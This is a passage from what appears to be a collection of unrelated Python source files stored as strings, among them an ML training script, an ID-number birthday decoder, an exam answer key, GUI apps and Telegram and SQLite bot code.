truncation=True)\n\n\nhf_dataset = Dataset.from_pandas(df[['preprocessed_text', 'label']])\ntokenized_dataset = hf_dataset.map(tokenize_function, batched=True)\ntrain_test_dataset = tokenized_dataset.train_test_split(test_size=0.2)\nprint(\"3\")\nmodel = DistilBertForSequenceClassification.from_pretrained('distilbert-base-uncased', num_labels=2)\nprint(\"3\")\ntraining_args = TrainingArguments(\n    output_dir='./results',\n    num_train_epochs=3,\n    per_device_train_batch_size=8,\n    warmup_steps=500,\n    weight_decay=0.01,\n    logging_dir='./logs',\n)\n\ndef compute_metrics(p: EvalPrediction):\n    preds = np.argmax(p.predictions, axis=1)\n    precision = precision_score(p.label_ids, preds, average='binary')\n    recall = recall_score(p.label_ids, preds, average='binary')\n    f1 = f1_score(p.label_ids, preds, average='binary')\n    accuracy = accuracy_score(p.label_ids, preds)\n    return {\n        \"precision\": precision,\n        \"recall\": recall,\n        \"f1\": f1,\n        \"accuracy\": accuracy\n    }\n\n\n# Include the compute_metrics function in your Trainer setup\ntrainer = Trainer(\n    model=model,\n    args=training_args,\n    train_dataset=train_test_dataset['train'],\n    eval_dataset=train_test_dataset['test'],\n    compute_metrics=compute_metrics,\n)\n\ntrainer.train()\n\nresults = trainer.evaluate()\nprint(results)\n\nprint(\"Test set metrics:\", results)\n\n#Obtain Predictions\npredictions = trainer.predict(train_test_dataset['test'])\n\n# 'predictions.predictions' contains the logits or output scores from the model\n# We apply softmax to convert these logits to probabilities and then argmax to get the predicted class\npreds = np.argmax(predictions.predictions, axis=-1)\n\n# 'predictions.label_ids' contains the true labels\ny_true = predictions.label_ids\ny_pred = preds\n\n# Step 2: Calculate Confusion Matrix\ncm = confusion_matrix(y_true, y_pred)\nprint(\"Confusion Matrix:\")\nprint(cm)\n",
    "\nnic = None\n\nprint(\"Enter Your Name: \", end='')\nname = input()\nnames = []\n\nname_1 = name.isdigit()\n\nif len(name) > 0 and name_1 == False:\n    name = name.lower()\n    print(\"Hi \" + name.title() + \" Welcome to M1 School\")\n    print(\"Enter Your NIC Number: \", end='')\n    nic = input()\n    nics = []\n    name1 = names.append(name)\n    nic1 = nics.append(nic)\n\nelse:\n    print(\"Invalid Input\")\n    exit()\n\nmid_number = None\nyear = None\n\nif len(nic) == 12 and nic.isdigit():\n    year = int(nic[0:4])\n    mid_number = int(nic[4:7])\n\nelif len(nic) == 10:\n    v = nic[9]\n    if v == 'v' or v == 'V':\n        year = int(nic[0:2]) + 1900\n        mid_number = int(nic[2:5])\n\nelse:\n    print(\"Invalid Input\")\n    exit()\n\ngender = None\n\nif 500 < mid_number <= 866:\n    gender = \"Miss.\"\n    mid_number = mid_number - 500\nelif 0 < mid_number <= 366:\n    gender = \"Mr.\"\nelse:\n    print(\"Invalid Input\")\n    exit()\n\nmonth_n = None\nday = None\nmonth = None\n\nif year > 1960:\n    year_1 = year / 4\n    year_2 = type(year_1)\n    if year_2 == int:\n        month_n = [31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366]\n    elif year_2 == float:\n        month_n = [31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365]\n    else:\n        print(\"Invalid Input\")\n        exit()\n\nelse:\n    print(\"Invalid Input\")\n    exit()\n\nmonths = {1: 'January', 2: 'February', 3: 'March', 4: 'April', 5: 'May', 6: 'June',\n          7: 'July', 8: 'August', 9: 'September', 10: 'October', 11: 'November', 12: 'December'}\n\nif mid_number <= month_n[0]:\n    month = 1\n    day = mid_number\nelif mid_number <= month_n[1]:\n    month = 2\n    day = mid_number - month_n[0]\nelif mid_number <= month_n[2]:\n    month = 3\n    day = mid_number - month_n[1]\nelif mid_number <= month_n[3]:\n    month = 4\n    day = mid_number - month_n[2]\nelif mid_number <= month_n[4]:\n    month = 5\n    day = mid_number - month_n[3]\nelif mid_number <= month_n[5]:\n    month = 6\n    day = mid_number - month_n[4]\nelif mid_number <= month_n[6]:\n    month = 7\n    day = mid_number - month_n[5]\nelif mid_number <= month_n[7]:\n    month = 8\n    day = mid_number - month_n[6]\nelif mid_number <= month_n[8]:\n    month = 9\n    day = mid_number - month_n[7]\nelif mid_number <= month_n[9]:\n    month = 10\n    day = mid_number - month_n[8]\nelif mid_number <= month_n[10]:\n    month = 11\n    day = mid_number - month_n[9]\nelif mid_number <= month_n[11]:\n    month = 12\n    day = mid_number - month_n[10]\nelse:\n    print(\"Invalid Input\")\n    exit()\n\nday = day - 1\nmonth = months.get(month)\n\nbrith_day = [month, day, year]\nbrith_days = []\nbrith_day1 = brith_days.append(brith_day)\n\nprint(\"Hi, \" + gender + name.title() + \" Your Birthday is \" + month + \" \" + str(day) + \", \" + str(year))\n",
    "simulados = {\r\n    \"Colmeias_Inicial\": {\r\n        \"Gabarito\": {\r\n            \"1\": {\"Resposta\": \"D\", \"Disciplina\": \"Portugu\u00eas\", \"Conteudo\": [\"Fun\u00e7\u00f5es da Linguagem\", \"Morfologia\"]},\r\n            \"2\": {\"Resposta\": \"A\", \"Disciplina\": \"Portugu\u00eas\", \"Conteudo\": [\"Morfologia\", \"Concord\u00e2ncia Verbal\"]},\r\n            \"3\": {\"Resposta\": \"A\", \"Disciplina\": \"Portugu\u00eas\", \"Conteudo\": [\"Fun\u00e7\u00f5es da Linguagem\", \"Varia\u00e7\u00e3o Lingu\u00edstica\"]},\r\n            \"4\": {\"Resposta\": \"C\", \"Disciplina\": \"Portugu\u00eas\", \"Conteudo\": [\"Figuras de Linguagem\", \"Morfologia\", \"Verbos\"]},\r\n            \"5\": {\"Resposta\": \"E\", \"Disciplina\": \"Portugu\u00eas\", \"Conteudo\": [\"Morfologia\", \"Substantivo, Adjetivo, Numeral e Artigo\"]},\r\n            \"6\": {\"Resposta\": \"D\", \"Disciplina\": \"F\u00edsica\", \"Conteudo\": [\"Movimento uniforme\", \"Matem\u00e1tica B\u00e1sica\", \"Porcentagem\"]},\r\n            \"7\": {\"Resposta\": \"B\", \"Disciplina\": \"F\u00edsica\", \"Conteudo\": [\"Ondulat\u00f3ria\", \"Movimento Uniforme\"]},\r\n            \"8\": {\"Resposta\": \"E\", \"Disciplina\": \"F\u00edsica\", \"Conteudo\": [\"Eletricidade\", \"Gr\u00e1ficos\"]},\r\n            \"9\": {\"Resposta\": \"E\", \"Disciplina\": \"Matem\u00e1tica\", \"Conteudo\": [\"Geometria Espacial\", \"Volume\"]},\r\n            \"10\": {\"Resposta\": \"A\", \"Disciplina\": \"Matem\u00e1tica\", \"Conteudo\": [\"Medidas de Centralidade e Dispers\u00e3o\", \"Tabela\"]},\r\n            \"11\": {\"Resposta\": \"B\", \"Disciplina\": \"Matem\u00e1tica\", \"Conteudo\": [\"Matem\u00e1tica B\u00e1sica\", \"Adi\u00e7\u00e3o e Subtra\u00e7\u00e3o\", \"Potencia\u00e7\u00e3o\", \"Radicia\u00e7\u00e3o\"]},\r\n            \"12\": {\"Resposta\": \"B\", \"Disciplina\": \"Matem\u00e1tica\", \"Conteudo\": [\"Porcentagem\", \"Matem\u00e1tica Financeira\"]},\r\n            \"13\": {\"Resposta\": \"C\", \"Disciplina\": \"Matem\u00e1tica\", \"Conteudo\": [\"Fun\u00e7\u00e3o do 1\u00ba Grau\", \"Gr\u00e1ficos\", \"Tabela\"]},\r\n            \"14\": {\"Resposta\": \"B\", \"Disciplina\": \"Geografia\", \"Conteudo\": [\"Conceitos em Geografia e Introdu\u00e7\u00e3o \u00e0 Demografia\", \"Migra\u00e7\u00f5es\"]},\r\n            \"15\": {\"Resposta\": \"E\", \"Disciplina\": \"Geografia\", \"Conteudo\": [\"Industrializa\u00e7\u00e3o Brasileira\"]},\r\n            \"16\": {\"Resposta\": \"C\", \"Disciplina\": \"Geografia\", \"Conteudo\": [\"Energia\"]},\r\n            \"17\": {\"Resposta\": \"C\", \"Disciplina\": \"Hist\u00f3ria\", \"Conteudo\": [\"Governo Vargas\"]},\r\n            \"18\": {\"Resposta\": \"B\", \"Disciplina\": \"Hist\u00f3ria\", \"Conteudo\": [\"Idade Moderna\"]},\r\n            \"19\": {\"Resposta\": \"B\", \"Disciplina\": \"Hist\u00f3ria\", \"Conteudo\": [\"Segunda Guerra Mundial\", \"Autoritarismo\"]},\r\n            \"20\": {\"Resposta\": \"A\", \"Disciplina\": \"Qu\u00edmica\", \"Conteudo\": [\"Qu\u00edmica Org\u00e2nica\"]},\r\n            \"21\": {\"Resposta\": \"A\", \"Disciplina\": \"Qu\u00edmica\", \"Conteudo\": [\"Qu\u00edmica Org\u00e2nica\", \"Classifica\u00e7\u00e3o e Hibridiza\u00e7\u00e3o do Carbono\", \"Classifica\u00e7\u00e3o de Cadeias Carb\u00f4nicas\"]},\r\n            \"22\": {\"Resposta\": \"D\", \"Disciplina\": \"Qu\u00edmica\", \"Conteudo\": [\"Equil\u00edbrio I\u00f4nico\"]},\r\n            \"23\": {\"Resposta\": \"D\", \"Disciplina\": \"Biologia\", \"Conteudo\": [\"Biociclos e Biomas\", \"Ecologia\"]},\r\n            \"24\": {\"Resposta\": \"C\", \"Disciplina\": \"Biologia\", \"Conteudo\": [\"Sa\u00fade\"]},\r\n            \"25\": {\"Resposta\": \"D\", \"Disciplina\": \"Biologia\", \"Conteudo\": [\"Citologia\"]}\r\n        },\r\n        \"Gabaritos_Alunos\": {\r\n            \"-NrBuWfRVnTXIqUkVD7j\": \"DADDCCBBDCBCBBECAAAABACCB\",\r\n            \"-NpPiXstkQhpVUwXk02x\": \"BCCBBADCDEBCBCCADBBCDCBCE\",\r\n            \"-NsZ2TUAS2FTuOMqw89H\": \"DADCBDBEEABBCBECABBAABCCD\",\r\n            \"-NruBjdIiUYUWW5ABguL\": \"DACACBCDEDBBCCEAAEBABCADD\",\r\n            \"-NsmN1MHlB1w7GpLDQ-U\": \"DBCCBCDCDBBABDACEDDABCDDD\",\r\n            \"-Ns_3c3m8k479xbwz92A\": \"DAECBECEAABACAECCBDBEBCCD\",\r\n            \"-Ns8MzOoubwwCWpPoAlD\": \"DDEDDCEECBBACBECBDBAADDDA\",\r\n            \"-NrerG7lApyhE37b23Bq\": \"DAACBBAEBABAEDCAEECACACDD\",\r\n            \"-NrtvOAF3cJtvYFfsGzC\": \"DAADDECDBABDCCAECADCBEACA\",\r\n            \"-NsOPDxVBhcxUnh9B-sR\": \"DCCCEBECABBCCABCDBBACECDD\",\r\n            \"-NtX17mTXwY95dYVHZ8U\": \"BAEBDCBEEADDCDECABBDBCDDE\",\r\n            \"-NpWcFSP1y7uAO3gQO7U\": \"DABBCBDEEABBAAECDBBAACCCD\",\r\n            \"-Ns8sq9Y9TPEtJqooBS6\": \"EECCABBECBBADACDECAAEBBAD\",\r\n            \"-NsnzcJn11H_CFbx-EmB\": \"DDACEEDCCABBEAECBBBABBDDD\",\r\n            \"-Ns8WSUNgdvUFcds4Z54\": \"DACCECCEBEBADABCEBBAAADED\",\r\n            \"-Ns9eSl96YVtghzvsAwD\": \"ABEDBCCDADDACABCBEBADBCDD\",\r\n            \"-NsY6FAnM58MtuZbY5hu\": \"DABDBCCCDEBAAABCCBCBBAEDC\",\r\n            \"-Nq2cAnk4ZFdNbiTXe79\": \"DABBACDDBBBAEDECDBBAADCCD\",\r\n            \"-NswaxcU1dM9Mi3FKZHK\": \"DABDCCBECEAECACDABDCBADCD\",\r\n            \"-NsmHzt00jL-Jlmah01W\": \"DACDEBDCBDBBDCABEEDBFFFFF\",\r\n            \"-Nt1TjePJxmLayK2xFmX\": \"DBADECBCDEADADCCBBDAAECCA\",\r\n            \"-NpWLdJkscUyYXH143pn\": \"DBCCEEDEBABACEBCBECAAADDB\",\r\n            \"-NpKGYe49ixF4BXth9dG\": \"DEDDCCAEBABDCABBCBCABCCCA\",\r\n            \"-NrpsYAA3XldX1MQDHpT\": \"DCCADADEDABACAACBBAACBDED\",\r\n            \"-NsmJ-pYkvkhcTRCTkTQ\": \"BCCBFCFCCFBDFDECCFFFFFFFF\",\r\n            \"-Npu365YyDNGcTeR7fh-\": \"DECCEADECEBDACECABBABAACD\",\r\n            \"-NpzrRxO6aaaWyn-osTm\": \"DCBDECAEDDBAAAECCDCABDDCC\",\r\n            \"-NsUCHyhCYuW4frHavih\": \"DCDCEACEDBBBEBECDBBACCDEA\",\r\n            \"-NpPaHEgFS-MtM6eoWrD\": \"DCACCABECBBACCECEBBACDDED\",\r\n            \"-NpM60kZr97ETBSjT3em\": \"DBDCEDBEAABBCBBCEBBAA",
    "from kivy.uix.boxlayout import BoxLayout\nfrom kivy.app import App\nfrom kivy.uix.button import Button\nfrom kivy.uix.widget import Widget\nfrom kivy.uix.label import Label\nfrom kivy.uix.gridlayout import GridLayout\n\nfrom kivy.config import Config\n\nConfig.set('graphics', 'resizable', False)\nConfig.set('graphics', 'width', 400)\nConfig.set('graphics', 'height', 500)\n\n\nclass Calculyator(App):\n    def build(self):\n        self.formula = \"0\"\n\n        bl = BoxLayout(orientation = 'vertical', padding = 25)\n        gl = GridLayout(cols = 4, spacing = 3, size_hint = (1, .6))\n\n        self.lbl = Label(text = \"0\", font_size = 40, halign = \"right\", valign = 'center', size_hint = (1, .4),\n                         text_size = (400 - 50, 500 * .4 - 50))\n        bl.add_widget(self.lbl)\n\n        gl.add_widget(Button(text = \"7\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"8\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"9\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"x\", on_press = self.add_operation))\n\n        gl.add_widget(Button(text = \"4\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"5\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"6\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"-\", on_press = self.add_operation))\n\n        gl.add_widget(Button(text = \"1\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"2\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"3\", on_press = self.add_number))\n        gl.add_widget(Button(text = \"+\", on_press = self.add_operation))\n\n        # gl.add_widget(Widget())\n        gl.add_widget(Button(text = \"0\", on_press = self.add_operation))\n        gl.add_widget(Button(text = \".\", on_press = self.add_operation))\n        gl.add_widget(Button(text = \"%\", on_press = self.add_operation))\n        gl.add_widget(Button(text = \"=\", on_press = self.calc_result))\n\n        bl.add_widget(gl)\n        return bl\n\n    def update_label(self):\n        self.lbl.text = self.formula\n\n    def add_number(self, instance):\n        if self.formula == \"0\":\n            self.formula = \"\"\n        self.formula += str(instance.text)\n        self.update_label()\n\n    def add_operation(self, instance):\n        if str(instance.text).lower() == \"x\":\n            self.formula += \"*\"\n        elif str(instance.text).lower() == \"%\":\n            self.formula += \"/\"\n        else:\n            self.formula += str(instance.text)\n\n        self.update_label()\n\n    def calc_result(self, instance):\n        try:\n            self.lbl.text = str(eval(self.lbl.text))\n            self.formula = \"0\"\n        except:\n            self.formula = \"0\"\n\n\nif __name__ == \"__main__\":\n    Calculyator().run()\n",
    "__all__ = (\"Register\",)\n\nfrom typing import List, Dict, Any\n\nimport json\n\nfrom .base import Page\n\nfrom PyQt5.QtCore import *\nfrom PyQt5.QtGui import *\nfrom PyQt5.QtWidgets import *\nfrom qasync import asyncSlot\n\nclass Register(Page):\n    \"\"\"The register page.\n    \"\"\"\n    NAME = \"register\"\n\n    def __init__(\n        self,\n        app\n    ):\n        super().__init__(app)\n\n\n    def register(self):\n        async def _internal():\n            u = await self.app.http.register(\n                self.username_input.text(),\n                self.name_input.text(),\n                self.password_input.text(),\n                self.email_input.text(),\n                self.birthdate_input.date().toPyDate(),\n            )\n            if u:\n                self.app.http.accounts[u['api_key']] = u\n                self.app.http.account = u\n                self.app.http.update_cache()\n                await self.clear_layout(self.layout)\n                await self.app.pages['home'].window()\n        self.app.loop.create_task(_internal())\n\n    def toggle_password_visibility(self, password_input, checkbox):\n        if checkbox.isChecked():\n            password_input.setEchoMode(QLineEdit.Normal)\n        else:\n            password_input.setEchoMode(QLineEdit.Password)\n\n    def register_layout(self):\n        register_layout = QVBoxLayout()\n        register_layout.setAlignment(Qt.AlignCenter)\n\n        name_label = QLabel('Name:')\n        register_layout.addWidget(name_label)\n        self.name_input = QLineEdit()\n        self.name_input.setFixedWidth(300)\n        register_layout.addWidget(self.name_input)\n\n        username_label = QLabel('Username:')\n        register_layout.addWidget(username_label)\n        self.username_input = QLineEdit()\n        self.username_input.setFixedWidth(300)\n        register_layout.addWidget(self.username_input)\n\n        password_label = QLabel('Password:')\n        register_layout.addWidget(password_label)\n        self.password_input = QLineEdit()\n        self.password_input.setEchoMode(QLineEdit.Password)\n        self.password_input.setFixedWidth(300)\n        register_layout.addWidget(self.password_input)\n        \n        password_visibility_toggle = QCheckBox(\"Show password\")\n        password_visibility_toggle.stateChanged.connect(lambda: self.toggle_password_visibility(self.password_input, password_visibility_toggle))\n        register_layout.addWidget(password_visibility_toggle)\n\n        email_label = QLabel('Email:')\n        register_layout.addWidget(email_label)\n        self.email_input = QLineEdit()\n        self.email_input.setFixedWidth(300)\n        register_layout.addWidget(self.email_input)\n\n        birthdate_label = QLabel('Birthdate:')\n        register_layout.addWidget(birthdate_label)\n        self.birthdate_input = QDateEdit()\n        self.birthdate_input.setFixedWidth(300)\n        self.birthdate_input.setCalendarPopup(True)\n        register_layout.addWidget(self.birthdate_input)\n\n        register_button = QPushButton('Register')\n        register_button.setFixedWidth(200)\n        register_button.clicked.connect(self.register)\n        register_layout.addWidget(register_button, alignment=Qt.AlignCenter)\n\n        login_button = QPushButton('Login Instead')\n        login_button.setFixedWidth(200)\n        login_button.clicked.connect(lambda: self.open_page(\"login\"))\n        login_button.setStyleSheet(\"border: none;\")\n        register_layout.addWidget(login_button, alignment=Qt.AlignCenter)\n\n        return register_layout\n\n\n    async def window(self):\n        w = self.widget\n        l = self.layout  # Create a QVBoxLayout instance\n        w.setWindowTitle(\"Planck | register\")\n        self.update_theme()\n\n        tlayout = await self.title_layout()\n        l.addLayout(tlayout)\n\n        register_layout = self.register_layout()\n        l.addLayout(register_layout)\n\n        nav_layout = await self.nav_layout()\n        l.addStretch(1)\n        l.addLayout(nav_layout)\n\n        w.show()\n\n",
    "import torch\nimport torch.nn as nn\nfrom torch.distributions import (\n    Normal,\n    TransformedDistribution,\n    TanhTransform,\n)\nfrom torch.distributions.transforms import TanhTransform\n\nclass SquashedGaussianHead(nn.Module):\n    def __init__(self, n, upper_clamp=-2.0):\n        super(SquashedGaussianHead, self).__init__()\n        self._n = n\n        self._upper_clamp = upper_clamp\n\n    def forward(self, x, is_training=True):\n        # bt means before tanh\n        mean_bt = x[..., : self._n]\n        log_var_bt = (x[..., self._n :]).clamp(-10, -self._upper_clamp)  # clamp added\n        std_bt = log_var_bt.exp().sqrt()\n        dist_bt = Normal(mean_bt, std_bt)\n        transform = TanhTransform(cache_size=1)\n        dist = TransformedDistribution(dist_bt, transform)\n        if is_training:\n            y = dist.rsample()\n            y_logprob = dist.log_prob(y).sum(dim=-1, keepdim=True)\n        else:\n            y_samples = dist.rsample((100,))\n            y = y_samples.mean(dim=0)\n            y_logprob = None\n\n        return y, y_logprob  # dist\n\n",
    "from aiogram import Router, types, F\nfrom keyboards.keyboadrs_collection import publish_keyboard\nfrom aiogram.fsm.context import FSMContext\nfrom states.my_states import GetDataState\nfrom aiogram.exceptions import TelegramForbiddenError\nfrom loader import bot\nfrom templates.admins import ADMINS, CHANNEL\nimport json\nimport os\n\n\nrouter = Router()\n\n\nasync def send_admin(user_data):\n    key = await publish_keyboard(user_data['id'])\n    message_text = f\"id \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f: {user_data['id']}\\n\u043e\u0442\u0432\u0435\u0442 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f: {user_data['answer']}\\n\u0442\u0435\u043a\u0441\u0442:\\n\\n {user_data['text']}\"\n    try:\n        await bot.send_message(ADMINS[0], message_text, reply_markup=key)\n    except TelegramForbiddenError:\n        pass\n\n\nasync def find_and_remove_entry_by_id(file_path, entry_id):\n    if not os.path.exists(file_path):\n        print(\"\u0424\u0430\u0439\u043b \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d.\")\n        return None\n\n    lines_to_keep = []\n    text_value = None\n    with open(file_path, 'r', encoding='utf-8') as file:\n        for line in file:\n            try:\n                data = json.loads(line)\n                # \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c, \u0441\u043e\u0432\u043f\u0430\u0434\u0430\u0435\u0442 \u043b\u0438 id \u0432 \u0442\u0435\u043a\u0443\u0449\u0435\u0439 \u0441\u0442\u0440\u043e\u043a\u0435 \u0441 \u0438\u0441\u043a\u043e\u043c\u044b\u043c\n                if str(data.get(\"id\")) == str(entry_id):\n                    text_value = data.get(\"text\")\n                else:\n                    lines_to_keep.append(line)\n            except json.JSONDecodeError:\n                continue  # \u041f\u0440\u043e\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u0438 \u0441 \u043e\u0448\u0438\u0431\u043a\u0430\u043c\u0438\n\n    # \u041f\u0435\u0440\u0435\u0437\u0430\u043f\u0438\u0441\u044b\u0432\u0430\u0435\u043c \u0444\u0430\u0439\u043b \u0431\u0435\u0437 \u0443\u0434\u0430\u043b\u0451\u043d\u043d\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\n    with open(file_path, 'w', encoding='utf-8') as file:\n        file.writelines(lines_to_keep)\n\n    return text_value\n\n\n@router.callback_query(lambda c: c.data.startswith('send') or c.data.startswith('cancel'))\nasync def callback_handler(query: types.CallbackQuery):\n    file_path = 'data.txt'\n    data = query.data\n    if data.startswith('send'):\n        g_id = data[len('send'):]\n        text_value = await find_and_remove_entry_by_id(file_path, g_id)\n        if text_value is not None:\n            await publish(text_value, g_id)\n        else:\n            await bot.send_message(ADMINS[0], '\u0417\u0430\u043f\u0438\u0441\u044c \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u0430 \u0438\u043b\u0438 \u0444\u0430\u0439\u043b \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442.')\n\n    elif data.startswith('cancel'):\n        g_id = data[len('cancel'):]\n        text_value = await find_and_remove_entry_by_id(file_path, g_id)\n        try:\n            await bot.send_message(g_id, '\u0412\u0430\u0448\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u0431\u044b\u043b\u043e \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u043e \u043c\u043e\u0434\u0435\u0440\u0430\u0442\u043e\u0440\u043e\u043c.\\n\u0418\u0437\u043c\u0435\u043d\u0438\u0442\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u0438 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0435\u0449\u0435 \u0440\u0430\u0437!')\n        except TelegramForbiddenError:\n            pass\n    await query.message.edit_reply_markup(reply_markup=None)\n\n\nasync def publish(text_value, g_id):\n    try:\n        await bot.send_message(CHANNEL[0], text_value)\n    except TelegramForbiddenError:\n        pass\n    try:\n        await bot.send_message(g_id, '\u0421\u043f\u0430\u0441\u0438\u0431\u043e! \u0412\u0430\u0448\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u043f\u0443\u0431\u043b\u0438\u043a\u043e\u0432\u0430\u043d\u043e \u0432 \u043a\u0430\u043d\u0430\u043b\u0435!')\n    except TelegramForbiddenError:\n        pass\n\n\n\n\n",
    "import aiosqlite, datetime\r\n\r\n#=======================================================================\r\nasync def create_db():\r\n    async with aiosqlite.connect(\"thread.db\") as db:  # menstrualz \u0438\u0448\u0430\u043a \u0431\u0435\u0437\u0434\u0430\u0440\u043d\u044b\u0439\r\n        cursor = await db.cursor()\r\n        query = '''\r\n        CREATE TABLE IF NOT EXISTS thread(\r\n            ownerid_thread INTEGER,\r\n            code INTEGER,\r\n            threadid INTEGER,\r\n            time INTEGER\r\n        )\r\n        '''\r\n        await cursor.execute(query)\r\n        print(\"\u0427\u0438\u043a\u0438 (\u041f\u0440\u0438\u0432\u0430\u0442\u043d\u043e\u0435 \u041e\u0431\u0449\u0435\u043d\u0438\u0435) \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u043e\\n \u0420\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u0439 - https://github.com/Crone720/GroupTalk-disnake\")\r\n        await db.commit()\r\n\r\n#=======================================================================\r\n\r\nasync def get_thread_info(id):\r\n    async with aiosqlite.connect('thread.db') as conn:\r\n        cursor = await conn.cursor()\r\n        await cursor.execute(\"SELECT * FROM thread WHERE threadid = ?\", (id,))\r\n        b = await cursor.fetchall()\r\n        return b\r\n\r\n\r\nasync def get_thread(member):\r\n    async with aiosqlite.connect(\"thread.db\") as db:\r\n        cursor = await db.cursor()\r\n        query = \"SELECT threadid FROM thread WHERE ownerid_thread = ?\"\r\n        await cursor.execute(query, (member,))\r\n        b = await cursor.fetchone()\r\n        return b[0] if b else None\r\nasync def add_thread(ownerid_thread, code, threadid, time):\r\n    async with aiosqlite.connect(\"thread.db\") as db:\r\n        cursor = await db.cursor()\r\n        query = \"INSERT INTO thread VALUES(?,?,?,?)\"\r\n        await cursor.execute(query, (ownerid_thread, code, threadid, time))\r\n        await db.commit()\r\n\r\nasync def del_thread(threadid):\r\n    async with aiosqlite.connect(\"thread.db\") as db:\r\n        cursor = await db.cursor()\r\n        query = \"DELETE FROM thread WHERE threadid = ?\"\r\n        await cursor.execute(query, (threadid,))\r\n        await db.commit()\r\n\r\nasync def get_code_thread(code):\r\n    async with aiosqlite.connect(\"thread.db\") as db:\r\n        cursor = await db.cursor()\r\n        query = \"SELECT threadid FROM thread WHERE code = ?\"\r\n        await cursor.execute(query, (code,))\r\n        b = await cursor.fetchone()\r\n        return b[0] if b else None\r\n    \r\nasync def get_owner_thread(id):\r\n    async with aiosqlite.connect(\"thread.db\") as db:\r\n        cursor = await db.cursor()\r\n        query = \"SELECT ownerid_thread FROM thread WHERE threadid = ?\"\r\n        await cursor.execute(query, (id,))\r\n        b = await cursor.fetchone()\r\n        return b[0]",
    "\"\"\"# CodeLinker package.\n\nThe core concept of this package is to treat language models as a function handler.\nBy defining a schema for return value of the function, we can call the function and let the model generate the return value.\n\nTo start with, we need to first define the configuration that will be used during exection:\n```python\nconfig = CodeLinkerConfig(api_keys={\n    \"gpt-3.5-turbo-16k\":[{\n        \"api_key\": \"your api key here\",\n        \"model\": \"model name alias here\"\n    }]\n})\ncl = CodeLinker(config)\n```\n\nThe we can define the schema of the return value:\n```python\nclass HelloWorldSchema(BaseModel):\n    message: str = Field(description=\"the message to be returned\")\n```\n\nThen we can use the `cl` object to wrap the function you want to call:\n```python\n@cl.smartFunc()\ndef hello_world() -> HelloWorldSchema:\n    '''Say hello to the world'''\n```\n\nNow we can call the function and let the model generate the return value:\n```python\nresult = hello_world()\nprint(result.message)\n# sample output:\n# Hello, World!\n```\n\nThe function wrapped by `cl.smartFunc` will have extra key-world arguments that can be used to control the output of the model:\n- `messages`: a list of messages that will be inserted into the beginning of the prompt\n- `images`: a list of images that will be inserted into the end of the prompt, following openai's message image format\n- `reply_format`: a reply format is a instance of `StructureSchema` that helps the model to better understand the context of the conversation.\n\n\n\n\"\"\"\n\n\nfrom .linker import CodeLinker\nfrom .config import CodeLinkerConfig",
    "import torch\nimport torchvision\nimport torchvision.transforms as transforms\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport os\nimport torch.nn.functional as F\n\ndef build_or_get_dataset(name, root='../data',task_generation=False):\n    assert os.path.exists(root), \"data directory doesnot exist\"\n    if task_generation:\n        transform = transforms.Compose([transforms.ToTensor(), preprocess])\n        target_transform = one_hot_encode\n    else :\n        transform = transform_rgb\n        target_transform = None\n    if name == 'cifar10':\n        trainset = torchvision.datasets.CIFAR10(root=root, train=True,download=True, transform=transform, target_transform=target_transform)\n        testset = torchvision.datasets.CIFAR10(root=root, train=False,download=True, transform=transform, target_transform=target_transform)\n        classes = ('plane', 'car', 'bird', 'cat', 'deer', 'dog', 'frog', 'horse', 'ship', 'truck')\n    if name == 'mnist':\n        trainset = torchvision.datasets.MNIST(root=root, train=True,download=True, transform=transform_mnist)\n        testset = torchvision.datasets.MNIST(root=root, train=False,download=True, transform=transform_mnist)\n        classes = tuple(str(i) for i in range(10))\n    if name == 'svhn':\n        trainset = torchvision.datasets.SVHN(root=root, split='train',download=True, transform=transform, target_transform=target_transform)\n        testset = torchvision.datasets.SVHN(root=root, split='test',download=True, transform=transform, target_transform=target_transform)\n        classes = tuple(str(i) for i in range(10))\n    return trainset, testset, classes\n\ndef get_dataloader(set, batch_size = 64, shuffle= True, drop_last=False):\n    dataloader = torch.utils.data.DataLoader(set, batch_size=batch_size,shuffle=shuffle,drop_last=drop_last)\n    return dataloader\n\ntransform_mnist = transforms.Compose([\n    transforms.ToTensor(),  # Convert to tensor\n    transforms.Normalize((0.5,), (0.5,))  # Normalize to [-1, 1] for grayscale images\n])\ntransform_rgb = transforms.Compose([\n    transforms.ToTensor(),                                   # Convert image to PyTorch tensor\n    transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))   # Normalize pixel values to [-1, 1]\n])\n\n\n\nn_bits = 8\ndef preprocess(x):\n    x = x * 255  # undo ToTensor scaling to [0,1]\n    n_bins = 2 ** n_bits\n    if n_bits < 8:\n        x = torch.floor(x / 2 ** (8 - n_bits))\n    x = x / n_bins - 0.5\n    return x\ndef postprocess(x):\n    x = torch.clamp(x, -0.5, 0.5)\n    x += 0.5\n    x = x * 2 ** n_bits\n    return torch.clamp(x, 0, 255).byte()\ndef one_hot_encode(target):\n    